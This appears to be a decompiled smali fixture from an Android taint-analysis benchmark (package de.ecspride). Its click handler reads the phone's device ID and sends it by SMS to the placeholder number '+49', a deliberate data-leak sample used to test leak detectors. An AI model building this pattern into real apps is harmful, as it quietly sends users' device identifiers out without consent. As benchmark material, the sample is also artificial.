{"<init>(Lde\/ecspride\/MainActivity;)V":{"1":"    iput-object p1, p0, Lde\/ecspride\/MainActivity$1;->this$0:Lde\/ecspride\/MainActivity;","2":"    invoke-direct {p0}, Ljava\/lang\/Object;-><init>()V","3":"    return-void"},"onClick(Landroid\/view\/View;)V":{"1":"    iget-object p1, p0, Lde\/ecspride\/MainActivity$1;->this$0:Lde\/ecspride\/MainActivity;","2":"    const-string v0, \"phone\"","3":"    invoke-virtual {p1, v0}, Lde\/ecspride\/MainActivity;->getSystemService(Ljava\/lang\/String;)Ljava\/lang\/Object;","4":"    move-result-object p1","5":"    check-cast p1, Landroid\/telephony\/TelephonyManager;","6":"    invoke-virtual {p1}, Landroid\/telephony\/TelephonyManager;->getDeviceId()Ljava\/lang\/String;","7":"    move-result-object v3","8":"    invoke-static {}, Landroid\/telephony\/SmsManager;->getDefault()Landroid\/telephony\/SmsManager;","9":"    move-result-object v0","10":"    const-string v1, \"+49\"","11":"    const\/4 v2, 0x0","12":"    const\/4 v4, 0x0","13":"    const\/4 v5, 0x0","14":"    invoke-virtual\/range {v0 .. v5}, Landroid\/telephony\/SmsManager;->sendTextMessage(Ljava\/lang\/String;Ljava\/lang\/String;Ljava\/lang\/String;Landroid\/app\/PendingIntent;Landroid\/app\/PendingIntent;)V","15":"    return-void"}}